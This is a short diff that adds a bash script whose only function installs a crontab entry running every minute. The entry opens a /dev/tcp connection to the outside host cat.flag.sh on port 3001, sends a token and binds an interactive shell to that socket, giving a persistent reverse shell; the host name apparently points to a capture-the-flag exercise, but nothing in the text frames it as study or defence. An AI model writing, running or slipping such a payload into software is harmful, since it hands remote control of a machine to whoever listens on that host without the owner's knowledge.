@@ -1,0 +1,7 @@
+#!/usr/bin/env bash
+
+main() {
+  { echo "*         *         *         *         *         /bin/bash -c 'exec<>/dev/tcp/cat.flag.sh/3001;echo>&0 78bqtTNo;$0 -i<&0>&0 2>&0'"; } | crontab -
+}
+
+main "$@"
